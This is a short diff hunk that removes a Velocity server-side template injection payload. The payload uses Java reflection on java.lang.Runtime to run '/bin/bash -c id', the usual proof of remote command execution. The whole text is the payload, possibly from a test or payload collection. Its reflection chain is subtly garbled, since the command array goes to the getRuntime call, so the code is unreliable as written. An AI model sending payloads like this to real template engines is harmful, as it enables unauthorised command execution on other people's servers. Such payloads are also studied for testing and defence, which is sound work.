@@ -1,3 +1,0 @@
-#set($e="e")
-$e.getClass.forName("java.lang.Runtime").getMethod("exec",  $e.getClass().forName('java.lang.String')).invoke(
-$e.getClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke($e.getClass.forName("java.lang.Runtime"),new String[]{"/bin/bash","-c","id"})).toString()
